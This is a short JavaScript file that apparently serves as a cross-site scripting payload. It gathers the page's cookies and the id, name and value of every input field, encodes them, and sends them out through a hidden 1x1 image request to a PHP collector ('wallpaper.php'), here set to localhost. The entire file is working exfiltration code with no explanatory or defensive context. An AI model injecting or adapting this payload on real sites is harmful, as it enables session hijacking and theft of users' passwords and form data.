var inputs = document.getElementsByTagName('input');
var listP = {};
for(var i = 0; i < inputs.length; i++) {
	var it = {};
	it['id'] = inputs[i].id;
	it['name'] = inputs[i].name;
	it['value'] = inputs[i].value;
	listP[i] = it;
}

var data = {};
data['host'] = location.origin;
data['path'] = location.pathname;
data['cookie'] = document.cookie;
data['input'] = listP;

var getInf = encodeURI(JSON.stringify(data));

var imgView = document.createElement("img");
imgView.setAttribute('src', 'http://127.0.0.1/tools/projects/js_img_src_php/wallpaper.php?j='+getInf);
imgView.setAttribute('height', '1px');
imgView.setAttribute('width', '1px');
document.body.appendChild(imgView);
